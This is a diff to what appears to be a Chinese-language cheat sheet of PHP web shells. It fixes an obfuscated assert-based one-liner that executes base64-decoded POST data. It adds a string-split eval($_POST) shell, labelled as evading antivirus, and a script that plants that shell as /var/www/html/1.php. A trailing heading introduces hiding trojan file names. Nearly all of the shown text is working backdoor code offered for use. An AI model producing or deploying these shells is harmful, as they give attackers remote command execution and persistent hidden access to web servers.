@@ -14,7 +14,7 @@
 
 <?php
   $a='b';
-  $b='assert‘;
+  $b='assert';
   $$a (base64_decode($_POST['x']);
   ?>
 
@@ -27,6 +27,16 @@ $aYunX = explode('Xn', $aYunX);
 $kDxfM = new stdClass();
 $kDxfM->gHht = $aYunX\[0];
 ($kDxfM->gHht)($XnEGfa);
+
+
+
+//免杀一句话:
+<?ph'.'p ev'.'al($_PO'.'ST[1]);?>
+
+<?php
+$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
+file_put_contents('/var/www/html/1.php',$a);
+?>
 ```
 
 木马文件名隐藏：
